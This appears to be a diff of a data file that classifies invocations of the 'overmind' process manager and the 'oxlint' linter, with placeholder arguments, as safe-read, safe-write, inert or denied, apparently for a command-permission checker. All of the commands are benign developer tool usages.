+overmind start -f x	safe-write
+overmind start -h	safe-write
+overmind start -i x	safe-write
+overmind start -l x	safe-write
+overmind start -m x	safe-write
+overmind start -p x	safe-write
+overmind start -r x	safe-write
+overmind start -s x	safe-write
+overmind start -t x	safe-write
+overmind start -w x	safe-write
+overmind start -x x	safe-write
+overmind start x	denied
+overmind status	inert
+overmind status --help	inert
+overmind status --help --network x	inert
+overmind status --help -h	inert
+overmind status --help x	denied
+overmind status --network x	inert
+overmind status --socket x	inert
+overmind status -S x	inert
+overmind status -h	inert
+overmind status -s x	inert
+overmind status x	denied
+overmind stop	safe-write
+overmind stop --help	safe-write
+overmind stop --help --network x	safe-write
+overmind stop --help -h	safe-write
+overmind stop --help x	safe-write
+overmind stop --network x	safe-write
+overmind stop --socket x	safe-write
+overmind stop -S x	safe-write
+overmind stop -h	safe-write
+overmind stop -s x	safe-write
+overmind stop x	safe-write
+overmind x	denied
+oxlint	safe-read
+oxlint --allow x	safe-read
+oxlint --config x	safe-read
+oxlint --deny x	safe-read
+oxlint --deny-warnings	safe-read
+oxlint --deny-warnings --allow x	safe-read
+oxlint --deny-warnings --disable-nested-config	safe-read
+oxlint --deny-warnings x	safe-read
+oxlint --disable-nested-config	safe-read
+oxlint --format x	safe-read
+oxlint --help	safe-read
+oxlint --import-plugin	safe-read
+oxlint --max-warnings x	safe-read
+oxlint --quiet	safe-read
+oxlint --report-unused-disable-directives	safe-read
+oxlint --rules	safe-read
+oxlint --tsconfig x	safe-read
+oxlint --version	safe-read
+oxlint --warn x	safe-read
+oxlint -A x	safe-read
+oxlint -D x	safe-read
+oxlint -V	safe-read
+oxlint -W x	safe-read
+oxlint -f x	safe-read
+oxlint -h	safe-read
+oxlint x	safe-read
